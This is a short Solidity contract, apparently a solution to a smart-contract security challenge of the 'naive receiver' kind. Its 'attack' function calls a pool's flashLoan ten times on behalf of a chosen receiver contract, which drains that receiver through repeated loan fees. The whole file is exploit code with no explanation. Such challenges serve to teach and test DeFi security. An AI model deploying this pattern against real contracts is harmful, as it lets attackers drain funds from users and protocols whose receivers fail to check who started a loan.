// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Ivault {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract AttackNaiveReciver {
    function attack(
        address pool,
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external {
        for (uint i = 0; i < 10; i++) {
            Ivault(pool).flashLoan(receiver, token, amount, data);
        }
    }
}
